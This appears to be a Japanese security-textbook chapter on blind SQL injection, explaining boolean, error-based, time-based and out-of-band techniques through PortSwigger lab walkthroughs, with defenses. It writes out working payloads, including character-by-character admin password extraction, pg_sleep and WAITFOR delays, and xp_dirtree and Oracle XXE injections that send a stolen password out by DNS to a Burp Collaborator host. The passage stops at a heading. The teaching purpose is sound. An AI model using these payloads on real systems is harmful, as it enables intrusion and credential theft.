# 第3章 Blind SQLi：boolean・time-based・OOB/OAST

## Blindの理論とboolean/timeラボ

前節までで扱ったUNION攻撃やエラーベース抽出は、アプリケーションのHTTPレスポンスに「クエリの実行結果」または「データベースのエラーメッセージ」がそのまま（あるいはヒントとして）現れることを前提とした、いわゆる**in-band（帯域内）**な手法だった。しかし実務で遭遇するSQLインジェクション脆弱性の多くは、そのどちらも起こらない。クエリは確かに注入可能だが、アプリケーションの見た目上のレスポンスは「ある」「ない」の二値、あるいは「変化なし」しか返してこない――これが本節の主題である**ブラインドSQLインジェクション（blind SQL injection）**である。

「blind（盲目的）」という語が示す通り、攻撃者はクエリの実行結果を直接目にすることができない。かわりに、アプリケーションの挙動のわずかな差分（レスポンス本文の一部が変わる、HTTPステータスやエラーの有無が変わる、レスポンスが返るまでの時間が変わる、あるいは外部ネットワークへの通信が発生する）を「オラクル（oracle、真偽を教えてくれる判定装置）」として利用し、1ビット・1文字ずつデータを推測して組み立てていく。効率はUNION攻撃に比べて著しく落ちるが、その分「どんな状況でも成立しうる」汎用性の高さが特徴であり、実際のバグバウンティやペネトレーションテストでは、こちらの手法を使いこなせるかどうかが成果を大きく左右する。

本節ではまず、PortSwiggerのWeb Security Academyが整理する4つの代表的なブラインドSQLi検知・悪用技法（条件付きレスポンス、条件付きエラー、時間遅延、OAST/帯域外）の原理を一つずつ「なぜそれで情報が漏れるのか」というメカニズムのレベルまで掘り下げて解説する。そのうえで、boolean-based（真偽値ベース）とtime-based（時間ベース）という2つの中核技法を、PortSwigger Academyの実ラボの手順に沿って実践する。

### ブラインドSQLiの定義と全体像

> Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
> （アプリケーションはSQLインジェクションに対して脆弱だが、そのHTTPレスポンスには関連するSQLクエリの結果も、データベースエラーの詳細も含まれない場合に、ブラインドSQLインジェクションが発生する。）

この定義のポイントは、脆弱性そのものの性質（任意のSQL構文を注入できる）はin-band型と何ら変わらないという点である。違いは**攻撃者から見える「窓」がふさがれている**ことだけであり、裏を返せば、注入されたSQL文はデータベース内部では通常通り実行され、何らかの副作用（レスポンスの内容分岐・エラーの有無・処理時間・外部通信）を必ず残す。ブラインドSQLiの攻略とは、この「見えない実行結果」を「見える副作用」に変換するサイドチャネルを見つけ出す作業だと言える。

PortSwigger Academyは、この副作用の種類に応じて技法を大きく4つに分類している。

1. 条件付きレスポンス（conditional responses） — レスポンス本文の内容が条件によって変わる
2. 条件付きエラー（conditional errors） — エラーの発生有無が条件によって変わる
3. 時間遅延（time delays） — レスポンスが返るまでの時間が条件によって変わる
4. 帯域外（out-of-band, OAST） — DNS等の別チャネルへの通信発生有無が条件によって変わる

> 出典: Blind SQL injection — https://portswigger.net/web-security/sql-injection/blind

### 技法1: 条件付きレスポンス（boolean-based blind）

もっとも基本的で、かつ実務での遭遇頻度が高いのがこの手法である。アプリケーションが「あるユーザーを認識した場合にだけ特定のメッセージを表示する」「検索結果が0件のときと1件以上のときで表示が変わる」といった**アプリケーションロジック上の条件分岐**を持っている場合、その分岐条件にSQLの真偽式を混ぜ込むことで、任意の真偽命題をアプリケーションに「聞く」ことができる。

例として、クッキー経由で渡される `TrackingId` がSQLクエリにそのまま埋め込まれ、該当するユーザーが見つかったときだけ「Welcome back」というメッセージが表示されるアプリケーションを考える。まず脆弱性の存在と、真偽に応じてレスポンスが変わることを確認する。

```
Cookie: TrackingId=xyz' AND '1'='1
Cookie: TrackingId=xyz' AND '1'='2
```

前者は常に真の条件を末尾に足しているため、注入前と同じ挙動（Welcome backが出る）になる。後者は常に偽の条件なので、Welcome backが消える。この2つのレスポンスに差分が出れば、任意の真偽式を注入してレスポンスの差分として読み出せることが確定する。

この仕組みが機能する原理は単純で、SQLの `AND` 演算子は元のWHERE句の真偽値と、注入した式の真偽値を論理積で結合する。元の条件が真であっても、注入した式が偽なら全体は偽になり、行が返らない（＝メッセージが消える）。つまり、注入した式そのものの真偽が、アプリケーションのレスポンス差分にそのまま射影される。

ここから一歩進んで、データベース内の任意の値を1文字ずつ推測できる。`SUBSTRING`（文字列の部分文字列を取り出す関数。DBMSによっては `SUBSTR` や `MID` などの名称違いがある）を使い、次のような真偽式を組み立てる。

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

これは「Administratorのパスワードの1文字目は's'である」という命題である。真であればWelcome backが表示され、偽であれば表示されない。1文字目の候補（a〜z、0〜9、記号など）をすべて試し、Welcome backが出た文字が正解の1文字目である。これを2文字目、3文字目……と位置をずらしながら繰り返すことで、パスワード全体を1文字ずつ復元できる。理論上の計算量は「文字数 × 候補文字種数」のリクエスト数で済み、候補が英数字62種・パスワード長20文字だとしても最大1240リクエスト程度であり、Burp Suiteの**Intruder**（複数のペイロードを自動的に差し替えながら大量にリクエストを送るツール）を使えば数分〜十数分で完了する。

> 出典: Blind SQL injection — https://portswigger.net/web-security/sql-injection/blind

### 技法2: 条件付きエラー（error-based blind）

アプリケーションのレスポンスに目に見える差分が全くない場合でも、データベースのエラー発生有無そのものをオラクルとして使える場合がある。`CASE` 式（条件分岐を行うSQL標準の構文。プログラミング言語の `if-else` に相当する）を使い、条件が真のときだけ意図的にエラーを起こす式を注入する。

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

`1=1` は常に真であるためこの例では常にエラーが起きるが、ここを任意の真偽式（前述の `SUBSTRING(...)='s'` など）に差し替えれば、真のときだけ `1/0`（ゼロ除算）が実行されてデータベースエラーが発生し、偽のときは無害な `'a'` が返って正常終了する。アプリケーション側でこのデータベースエラーがHTTP 500やタイムアウト、あるいは僅かなレスポンス差分として表面化しさえすれば、それがそのままオラクルになる。

なぜこれが機能するかというと、SQLの `CASE WHEN` はプログラミング言語の条件分岐と同様に、選択された枝の式だけが評価される（他方の枝は評価されない、いわゆる遅延評価・短絡評価に近い性質を持つ）ためである。したがって `1/0` という「本来なら常にエラーになるはずの式」を、条件が真の場合にだけ評価させることができ、エラー発生そのものを真偽値の運び手として使える。

さらに、データベースの設定によっては、型変換の失敗時に発生するエラーメッセージの中に、変換しようとした**値そのもの**が含まれてしまうことがある。`CAST()`（明示的な型変換を行う関数）を使い、抽出したい値を意図的に非互換な型へ変換させることで、本来ブラインドだったはずの脆弱性を、エラーメッセージ経由で値を直接読み取れる「疑似in-band」な状態に変換できる。

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

`example_column` が文字列を含む場合、これを整数型へ変換しようとすると失敗し、多くのDBMSでは「値 '...' を int に変換できません」といった形式のエラーメッセージに、変換しようとした実際の文字列値が埋め込まれる。これは冗長エラーメッセージ（verbose error message）の一種であり、本番環境でこのような詳細なエラーがそのまま利用者に返されることは設計不備・設定不備の典型例である。

> 出典: Blind SQL injection — https://portswigger.net/web-security/sql-injection/blind

### 技法3: 時間遅延（time-based blind）

レスポンス本文にもエラーにも一切の差分が現れないケースでは、最後の手段として**時間**そのものをオラクルとして使う。アプリケーションがデータベースへのクエリを同期的に実行している（クエリの完了を待ってからレスポンスを返す）限り、クエリの実行に意図的な遅延を仕込めば、その遅延がそのままHTTPレスポンスの遅延として観測できる。

Microsoft SQL Serverの例:

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

`WAITFOR DELAY` はSQL Serverが提供する、指定した時間だけ処理を一時停止する文である。`IF` 文で条件分岐させ、条件が真のときだけこの遅延文を実行させれば、レスポンスが10秒遅れて返ってくるかどうかで真偽を判定できる。条件部分を `SUBSTRING(...)='x'` のような値の一部を問う式に差し替えれば、boolean-based技法と全く同じ手順で文字列を1文字ずつ復元できる。唯一の違いは、真偽の観測方法が「レスポンスの内容」から「レスポンスにかかった時間」に変わる点だけである。

この技法が有効な原理は、Webアプリケーションのリクエスト処理モデルのほとんどが「DBへのクエリ発行 → 完了待ち（ブロッキングI/O） → 結果整形 → レスポンス送信」という同期的な流れを取っている点にある。データベース側の処理時間が伸びれば、アプリケーションサーバの処理もそのぶん止まり、結果としてクライアントが受け取るレスポンスも遅延する。この因果関係さえ成立していれば、レスポンス本文が完全に空白であっても、エラーが一切表面化しなくても、時間差という物理的なチャネルだけは塞ぎようがない。したがって時間ベース技法は、ブラインドSQLiの中でも「最後の砦」的な汎用性を持つ。

ただし実務上の注意点として、ネットワークの揺らぎ（ジッタ）やサーバの負荷変動により、遅延時間の計測にはノイズが乗る。数秒程度の閾値（例: 10秒）を使い、複数回試行して再現性を確認することがフォールスポジティブを避けるうえで重要である。

> 出典: Blind SQL injection — https://portswigger.net/web-security/sql-injection/blind

### 技法4: 帯域外（OAST）技法

条件付きレスポンスも条件付きエラーも時間遅延も、いずれも「クエリが同期的に処理され、かつ何らかの形で観測可能な副作用を残す」ことを前提としている。しかし、クエリが非同期的に処理される（バックグラウンドジョブとしてキューに積まれるなど）場合、これらの前提そのものが崩れ、上記3技法はいずれも使えなくなる。このようなケースで有効なのが**OAST（Out-of-Band Application Security Testing、帯域外アプリケーションセキュリティテスト）**である。

OASTの発想は単純で、HTTPレスポンスという「往路のチャネル」を介さず、データベースサーバ自身に**別の通信路（多くの場合DNS）**を使わせて、攻撃者が管理するサーバに直接データを送らせるというものである。DNSが選ばれる理由は、本番ネットワークの多くがアウトバウンドのDNS通信をほぼ無制限に許可しており、ファイアウォールで塞がれる可能性が低いためである。

Microsoft SQL Serverでの存在確認（脆弱性の有無だけを確認する）例:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

`xp_dirtree` はSQL Serverの拡張ストアドプロシージャで、本来はファイルサーバ上のディレクトリツリーを列挙するための機能だが、UNC（Universal Naming Convention）パス形式の引数を渡すと、OS側のSMB名前解決機構がそのホスト名（この例では `burpcollaborator.net` のサブドメイン）をDNS解決しようとする。この解決要求が、攻撃者が監視しているDNSサーバ（Burp Suiteの**Burp Collaborator**が、リクエストごとに一意なサブドメインを発行し、そのサブドメインへの問い合わせを記録・通知してくれる)に届けば、注入したSQL文が確かに実行されたことが（HTTPレスポンスを一切介さずに）証明できる。

さらにこの仕組みを応用し、データそのものをDNSクエリのサブドメイン部分に埋め込んで持ち出すことができる。

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

これは変数 `@p` にAdministratorのパスワードを代入し、それを文字列連結でUNCパスのホスト名部分に組み込んでから `xp_dirtree` を実行している。結果として発生するDNSクエリは、たとえば以下のような形になる。

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Collaboratorのログを確認すれば、サブドメインの先頭部分（`S3cure`）としてパスワードの値がそのまま届いていることが分かる。boolean-basedやtime-basedが1文字ずつ何百回もリクエストを送る必要があるのに対し、OASTはうまくいけば1リクエストで値全体を丸ごと持ち出せるため、条件さえ揃えば圧倒的に効率が良い。

なお、DNSのラベル（ドット区切りの各セグメント）は63バイトまで、ホスト名全体でも253バイト程度という制約があるため、長大なデータを1回のクエリで送りきれない場合は分割送信が必要になる点には注意したい。

> 出典: Blind SQL injection — https://portswigger.net/web-security/sql-injection/blind

### 防御

> Blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.
> （ブラインドSQLインジェクション攻撃は、ユーザー入力が意図したSQLクエリの構造に干渉できないようにする、パラメータ化クエリの適切な利用によって防止できる。）

ここで強調すべきは、ブラインド特有の追加対策が存在するわけではないという点である。第2章で扱ったUNION攻撃・エラーベース抽出と同様、根本原因は「ユーザー入力をSQL文の構文の一部として解釈させてしまうこと」にあり、対策もまったく同じ、すなわちプレースホルダを使ったパラメータ化クエリ（プリペアドステートメント）によって、入力値を常にリテラルなデータとして扱わせることに尽きる。裏を返せば、検知の難易度がin-band型より高いだけで、脆弱性としての深刻度・対策の方向性は変わらない。

> 出典: Blind SQL injection — https://portswigger.net/web-security/sql-injection/blind

### ラボ実践1: 条件付きレスポンスによるboolean-basedブラインドSQLi

ここからは、PortSwigger Web Security Academyが提供する実ラボの手順に沿って、boolean-based blind SQLiを実際に手を動かして攻略する。

#### ゴールとシナリオ

このラボの目標は「`administrator` ユーザーとしてログインすること」である。アプリケーションはクッキー経由でユーザーを追跡しており、そのクッキー値をSQLクエリにそのまま使っている。クエリの実行結果自体は画面に表示されないが、該当する行が見つかった場合にだけ「Welcome back」というメッセージが表示される。攻撃者はこの1ビットの情報（表示される／されない）だけを頼りに、隠された `users` テーブルからadministratorのパスワードを文字単位で割り出す必要がある。

ヒントとして、パスワードは小文字英数字のみで構成されていることが示されている。

#### 手順

**ステップ1: 脆弱性の存在と真偽差分の確認**

`TrackingId` クッキーに対して、常に真になる条件と常に偽になる条件を送り、レスポンスの差分を確認する。

```
Cookie: TrackingId=xyz' AND '1'='1
Cookie: TrackingId=xyz' AND '1'='2
```

前者で「Welcome back」が表示され、後者で表示されなければ、真偽値に応じてレスポンスが変わる注入点が存在することが確定する。

**ステップ2: テーブルの存在確認**

```sql
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

`users` というテーブルが実在し、かつ最低1行存在することを、サブクエリが空を返さずに `'a'` という値を1行返せるかどうかで確認する。テーブル名が違えば構文エラーになり、テーブルが空ならサブクエリが行を返さず全体が偽になる。

**ステップ3: 対象ユーザーの存在確認**

```sql
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

`username` カラムに `administrator` という値を持つ行が存在するかを同様に確認する。

**ステップ4: パスワード長の特定**

`LENGTH()`（文字列長を返す関数。DBMSにより `LEN()` などの表記差がある）を使い、パスワードの文字数を二分探索的に絞り込む。

```sql
xyz' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator
xyz' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>2)='administrator
...
```

境界値（この条件が真から偽に転じる数値）を探すことで、正確なパスワード長（このラボでは20文字）が判明する。長さが分かっていれば、後続の文字抽出処理で「何文字目まで確認すればよいか」が明確になり、無駄なリクエストを防げる。

**ステップ5: Burp Intruderによる文字の自動抽出**

パスワードの各文字位置に対して `SUBSTRING(password, position, 1)` を使い、位置と候補文字を組み合わせた大量のリクエストをBurp Intruderで送信する。

```sql
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1)='a
```

Intruderの**Cluster bomb**または**Sniper**攻撃タイプを使い、位置（1〜20）と候補文字（a〜z, 0〜9）の組み合わせを総当たりで送信し、レスポンス本文に「Welcome back」という文字列が含まれるリクエストだけを**Grep - Match**機能でフィルタする。ヒットした行の候補文字が、その位置の正解文字である。これを全20文字分繰り返すことで、パスワード全体が復元される。

**ステップ6: ログイン**

復元した20文字のパスワードを使い、`administrator` としてログインフォームから認証する。ログインに成功すればラボクリアとなる。

#### なぜこの手順が有効なのか

この一連の手順が成立する根拠は、`AND` によるブール結合が、注入した任意の式の真偽値をレスポンスの分岐（Welcome backの有無）にそのまま「透過」させる点にある。攻撃者は本質的に「はい／いいえ」でしか答えが返らない質問しかできないが、`SUBSTRING` で問う対象を1文字ずつずらし、候補をしらみつぶしにすることで、この極めて制約の強いチャネルからでも任意長の文字列を完全に復元できる。これは情報理論的に見れば、1回の真偽判定で最大1ビットの情報しか得られない状況で、候補数×文字数回の試行によって必要な情報量（文字数×log2(候補数)ビット）を線形回数のクエリで満たしている、と説明できる。

> 出典: SQL injection - Lab: Blind SQL injection with conditional responses — https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

### ラボ実践2: 時間遅延によるtime-basedブラインドSQLi

#### ゴールとシナリオ

このラボの目標は「SQLインジェクション脆弱性を悪用して10秒の遅延を発生させること」である。前のラボと同様に分析用のトラッキングクッキーがSQLクエリに使われているが、このラボではクエリの結果もエラーの有無も一切レスポンスに表れない。唯一の手がかりは、クエリが**同期的に**実行されるという性質、すなわちデータベース側の処理が遅くなれば、アプリケーションのレスポンスもそのぶん遅くなるという事実だけである。

#### 手順

**ステップ1: リクエストの捕捉**

Burp Suiteでショップのトップページへのリクエストをインターセプトし、`TrackingId` クッキーを送出しているリクエストを見つける。

**ステップ2: 時間遅延ペイロードの注入**

このラボのバックエンドはPostgreSQLであるため、PostgreSQLの `pg_sleep()`（指定秒数だけ現在のセッションの処理を一時停止する関数）を使う。

```
Cookie: TrackingId=x'||pg_sleep(10)--
```

ここで `||` はPostgreSQLにおける**文字列連結演算子**である。元のクエリが `TrackingId` の値を文字列として扱う構造（例: `... WHERE TrackingId = 'x'`）になっていることを利用し、閉じたクォートの直後に `||pg_sleep(10)` を連結させることで、文字列結合の一部として `pg_sleep(10)` が評価され、副作用として10秒間の遅延が発生する。末尾の `--` はそれ以降の元のクエリ文字列（残りのクォートなど）をコメントアウトし、構文エラーを防ぐためのものである。

**ステップ3: リクエストの送信と計測**

変更したリクエストをRepeaterなどで送信し、レスポンスが返るまでの時間を計測する。約10秒の遅延が確認できれば、注入が成功しクエリが実際に実行されたことが証明され、ラボはクリアとなる。

#### なぜこの手順が有効なのか

このラボの核心は、`pg_sleep()` という「時間を消費するだけで、他に一切の副作用を持たない関数」を、文字列連結という一見無害な構文経由でクエリの中に忍び込ませている点にある。アプリケーション側は「クッキー値を使ってDBに問い合わせ、結果を待ってからレスポンスを組み立てる」という同期処理モデルを取っているため、DB側の処理時間の増加分がそのままHTTPレベルのレイテンシとして観測される。これは技法3で述べた原理そのものであり、`WAITFOR DELAY`（SQL Server）と `pg_sleep()`（PostgreSQL）はDBMSが違うだけで、果たす役割は完全に同一である。条件付き遅延（`IF`文で分岐させて特定の場合だけ遅延させる）にすればboolean-basedと同じ手順で文字列を1文字ずつ抽出できるが、このラボでは「遅延を発生させられること自体の証明」がゴールなので、無条件に `pg_sleep(10)` を実行させるだけで達成できる。

> 出典: SQL injection - Lab: Blind SQL injection with time delays — https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

### 本節のまとめと次節への接続

ブラインドSQLiは、in-band型の「見えるデータ漏洩」から、副作用を介した「間接的な1ビット漏洩」へと攻撃モデルを転換させる技法群である。条件付きレスポンス・条件付きエラー・時間遅延・OASTの4技法は、いずれも「注入した真偽式の評価結果を、何らかの観測可能なチャネルに変換する」という同じ骨格を持っており、どのチャネルが使えるかはアプリケーションの実装やネットワーク環境に依存する。実務では、まずレスポンス差分（最も手間が少ない）を試し、それが不可能ならエラー差分、それも塞がれていれば時間、最後の手段としてOASTという優先順位で試していくのが定石である。

本節で扱ったboolean-basedとtime-basedの手法は、いずれも1文字ずつの逐次抽出という点で人手では非現実的な作業量になるため、実務ではBurp Intruderやsqlmapのような自動化ツールを組み合わせて使うのが一般的である。次節以降では、これらの手法を土台としたより高度な抽出テクニックや、OASTを実践するためのツール活用（Burp Collaboratorの具体的な設定）について扱っていく。

## OOB/OASTとエラー誘発型Blind

これまでの節でboolean-basedとtime-basedのblind SQLiを見てきた。この2つはいずれも「アプリケーションのレスポンス（内容の差分、あるいは応答遅延）」を観測してデータを推測する手法だった。しかし現実のシステムには、SQLインジェクションが確かに成立しているのに、アプリケーションのHTTPレスポンスには一切変化が現れないケースがある。たとえば、注入したクエリが非同期に（レスポンスをクライアントへ返した後に）実行される場合や、結果がログにしか書き込まれずレスポンスボディに反映されない場合である。このようなケースでは、レスポンスの真偽差分にもタイミング差にも頼れない。

ここで使うのが **OOB（Out-Of-Band、帯域外）** 技術、別名 **OAST（Out-of-Band Application Security Testing）** である。アプリケーションのHTTPレスポンスという「帯域内（in-band）」のチャネルを使わず、DBサーバー自身にDNSクエリやHTTPリクエストを外部の攻撃者管理サーバーへ発行させ、そのネットワーク到達自体を証拠・データ搬出チャネルとして使う。もう一つ、本節ではその親戚である **エラー誘発型（conditional errors）blind SQLi** も扱う。これはレスポンスの「内容」ではなく「エラーの発生有無（HTTPステータスやエラーページの出現）」を真偽値として使う手法で、boolean-basedの亜種と言えるが、アプリがSELECT結果を一切表示しない場合でも使える点でOOBに近い実務上の位置づけを持つ。

### なぜOOBが必要になるのか：帯域内チャネルが使えない状況

boolean-based/time-basedのいずれも「HTTPリクエスト→SQL実行→HTTPレスポンス」という一往復の中でシグナルを得ることを前提にしている。ところが以下のようなケースではこの前提が崩れる。

- 注入点が analytics 記録やログ書き込みのような **副作用的なクエリ**（例: `INSERT INTO logs (...) VALUES ('$cookie')`）で、その結果はレスポンスにもエラーにも一切影響しない。
- バッチ処理やメールキューのように、注入されたクエリが **リクエスト処理の外側（非同期）** で後から実行される。
- WAFやアプリ側の例外ハンドラがエラーメッセージを完全に握りつぶしており、conditional errorsの手がかりすら得られない。

このような「真の意味で完全に盲目（fully blind）」な状況で機能する唯一の手段が、DBサーバー自身に外部ネットワークへ通信させ、その通信をアプリケーションの外側（別のチャネル）で観測することである。これがOOB/OASTの核心的発想である。

### Burp CollaboratorとOASTの仕組み

PortSwiggerのラボページでは、この技術を次のように説明している。

> 出典: Blind SQL injection with out-of-band interaction — https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

記事によれば、out-of-band（OAST）技術はSQLクエリが**非同期に実行され、アプリケーションのレスポンスに一切影響しない**場合に有用とされる。この手法では、注入したSQL文の中にDNS参照やHTTPリクエストを発生させるペイロードを仕込み、DBサーバーに外部ホスト名への名前解決やHTTPアクセスを行わせる。

Burp Suiteに付属する **Burp Collaborator** は、この「外部ホスト」の役割を果たす専用サーバーである。Collaboratorは一意のサブドメイン（例: `abcdefg12345.oastify.com` のようなランダム文字列を含むホスト名）を発行し、そのサブドメインに対して発生したDNSクエリやHTTPリクエストをすべて記録する。攻撃者はこの一意のサブドメインをSQLペイロードに埋め込み、ラボ側（Burpのブラウザ内蔵ツール）でそのサブドメインへの着信を監視することで、次の2点を証明できる。

1. **インジェクションが成立している**（脆弱性の確認、いわゆるブラインドOOB確認）。
2. データをDNSラベルやHTTP経路の一部として埋め込めば、**データ自体をDNSクエリ経由で外部に持ち出せる**（OOBデータ搬出、exfiltration）。

DNS解決という仕組みが使われる理由は単純で、DNSクエリは多くのネットワーク境界（外向きHTTPをブロックするファイアウォールなど）を通過しやすく、DBサーバーやアプリケーションサーバーが外部DNSリゾルバに到達できる環境は非常に多いためである。また名前解決は「送信して即座に忘れる」性質の通信であり、アプリケーション側のコードパスに手を加えなくても、DBエンジンの機能（XML外部実体参照、UTL_HTTPパッケージ、xp_dirtreeなど）を悪用するだけで発火させられる。

### ラボの実際のペイロード：Oracle XXE経由のDNS漏出

PortSwiggerのラボ（Oracle DBバックエンド）で提示されている攻略ペイロードは以下の形である。

```sql
' UNION SELECT EXTRACTVALUE(xmltype(
  '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote; ]>'
), '/l') FROM dual--
```

URLエンコードされたcookie値としては次の形で送信する（記事から抽出）。

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

**なぜこれで動くのか（仕組みレベル）**

- `EXTRACTVALUE(XMLType, XPath)` はOracleのSQL/XML関数で、第1引数のXML文書に対して第2引数のXPath式を評価し文字列を返す。この関数自体はSQLインジェクションの構文上「値を1つ返す式」として振る舞うため、`SELECT` のカラムリストに埋め込める。
- 渡すXML文書のDOCTYPE宣言内で **外部パラメータ実体（parameter entity）** `%remote` を定義し、その`SYSTEM`識別子にBurp CollaboratorのURLを指定している。XMLパーサはDTDを処理する際、この外部実体を解決しようとして**HTTPリクエスト（あるいはDNS解決を伴うアクセス）を発行する**。これがいわゆる **XXE（XML External Entity）** の仕組みであり、ここではSQLiの中にXXEを組み合わせることで、Oracleの内蔵XMLパーサに外部通信をさせている。
- Oracle DBは標準関数としてXML処理機能（`XMLType`、`EXTRACTVALUE`など）を持つため、追加の権限やライブラリなしにこの経路が使えることが多い。これが、Oracle環境で頻繁にこのテクニックが使われる理由である。
- クエリが構文的に成功しても失敗しても、DTD解析の時点で外部エンティティの取得が試みられるため、たとえ`EXTRACTVALUE`が最終的にエラーで終わっても**DNSクエリ自体は発生する**。つまりこの手法は、レスポンスが200であろうと500であろうと成立し、まさに「レスポンス内容に依存しない」OOBの利点を体現している。

なお、Oracleにはこの他にも `UTL_HTTP.REQUEST()`（HTTPリクエストを直接発行するPL/SQLパッケージ）、`UTL_INADDR.GET_HOST_ADDRESS()`（DNS名前解決を行う関数）など、同様の外部通信を起こせる組み込み機能が存在する。MySQLでは`LOAD_FILE()`によるUNCパス経由のSMB通信、SQL Serverでは`xp_dirtree`や`xp_fileexist`によるUNCパス経由の通信が、それぞれのDBMSにおけるOOBの定番手段として知られる。原理はすべて共通で、「DBエンジンが持つファイル/ネットワークアクセス機能を、SQL式の中から間接的に呼び出させる」という点にある。

### ラボの攻略手順（要約）

1. Burpのブラウザで対象ページにアクセスし、リクエストをインターセプトする。
2. リクエスト中の `TrackingId` Cookieを標的とし、Burp Intruderまたは手動でペイロードを注入する。
3. Burpの「Collaboratorクライアント」機能を開き、一意のペイロード（サブドメイン）を生成する。
4. 上記SQLペイロード中の`BURP-COLLABORATOR-SUBDOMAIN`をこの生成したホスト名に置き換えて送信する。
5. しばらく待ってから「Poll now」でCollaboratorへの着信を確認する。DNSクエリ（あるいはHTTPリクエスト）のログが表示されれば、インジェクションの成立が証明される。

この確認フローは、実運用のバグバウンティ調査でも同じ形で使われる。特に「エコーバックが一切ない」フォーム入力や、Webhook／非同期ジョブ経由で処理されるパラメータを狙うときに、まずOASTペイロードを送って「そもそもSQL実行されているか」を最速で確認するのが定石である。

### 対策（OOB/OASTに対する防御）

- **プレースホルダを使ったパラメータ化クエリ**（プリペアドステートメント）の徹底。これがあればそもそも文字列連結によるSQL構文の破壊自体が起こらず、XMLペイロードもただのデータとして扱われる。
- DBMSの不要な拡張機能・パッケージの無効化。Oracleであれば`UTL_HTTP`、`UTL_INADDR`、XML外部実体解決などへのアクセス制限（DTD処理の無効化、ネットワークACLでの出口制限）。
- **DBサーバーからの外向きネットワーク通信を既定で禁止**するネットワークポリシー（エグレスフィルタリング）。DBサーバーが任意の外部ホストへDNS解決やHTTP接続を行える必要は通常ない。
- WAFや異常検知による、DBサーバー発の不審なDNS/HTTPトラフィックの監視。

### エラー誘発型（conditional errors）Blind SQLi

続いて、レスポンスの「内容」ではなく「エラーの有無」を真偽値チャネルとして使う手法を見る。

> 出典: Blind SQL injection with conditional errors — https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

このラボが想定する状況は、アプリケーションがトラッキング用Cookieの値をそのままSQLクエリに埋め込んで実行しているが、**SELECT結果そのものはレスポンスに一切反映されない**（analytics用の裏方クエリ）というものである。一方でアプリケーションは、SQLクエリが**エラーを起こした場合にはカスタムエラーメッセージ（あるいは異なるHTTPステータス、典型的には500）を返す**という性質を持つ。この「エラーが出たか出なかったか」という1ビットの差分こそが、通常のboolean-basedにおける「真偽によるコンテンツ差分」の代替チャネルになる。

**基本アイデア**: 真偽条件によって、成功するクエリとエラーになるクエリを出し分ける。条件が真のときだけ意図的にゼロ除算やキャスト失敗などのランタイムエラーを起こす式を書く。

**Oracle特有の注意点**: Oracleでは`FROM`句を省略できない（`SELECT 1` は文法エラーになる）ため、ダミーテーブルとして `dual` を使う必要がある（`SELECT 1 FROM dual`）。この点はMySQL/PostgreSQLとの明確な差であり、Oracle対象のペイロードを書くときは必ず`FROM dual`を付与する。

まず構文が通ることを確認する基本形（連結演算子`||`を使って既存クエリに式を継ぎ足す）。

```sql
xyz'||(SELECT '' FROM dual)||'
```

これでエラーが出ないことを確認したら、条件付きでエラーを起こす式に置き換える。

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**なぜこれで動くのか（仕組みレベル）**

- `CASE WHEN <条件> THEN <式A> ELSE <式B> END` はSQL標準の条件分岐式であり、評価結果として`<条件>`が真なら`<式A>`、偽なら`<式B>`を返す1つの値になる。これは制御構文ではなく**値を返す式**なので、`SELECT`のカラムリストや連結演算子の右辺など、値が要求される任意の位置に埋め込める。boolean-basedで使う`AND 1=1`のような論理式による条件分岐を、DBの型システム・エラー生成機構と組み合わせて「見える形」に変換していると理解するとよい。
- `TO_CHAR(1/0)`は、`1/0`というOracleにおけるゼロ除算をまず評価する。Oracleでは整数のゼロ除算は`ORA-01476: divisor is equal to zero`というランタイムエラーを発生させる。これは構文エラーではなく**式評価時の実行時エラー**である点が重要で、クエリ全体の構文自体は正しいまま、評価順序に従って条件付きで例外が飛ぶ。
- `TO_CHAR()`で包んでいるのは、`CASE`式の`THEN`節と`ELSE`節で**返す値の型を一致させる**ため（Oracleは`CASE`の各分岐の戻り値型が一致することを要求する）。`ELSE ''`（文字列）に対して`THEN`側も文字列型で揃える必要があるため、数値演算の結果を`TO_CHAR`で文字列に変換している。この型合わせを怠ると、条件の真偽に関係なく常に型エラーになってしまい、真偽の弁別ができなくなる。
- 条件（`1=1`のような、後に注入したいブール式に置き換える部分）が真であれば`TO_CHAR(1/0)`が評価されて例外が発生し、アプリケーションはエラー（多くの場合HTTP 500とカスタムエラーページ）を返す。偽であれば`ELSE ''`が評価され、ゼロ除算は起こらずクエリは正常終了し、通常のHTTP 200レスポンスが返る。この「500か200か」の二値がそのままboolean-based blindにおける真偽シグナルになる。

**攻略の流れ**

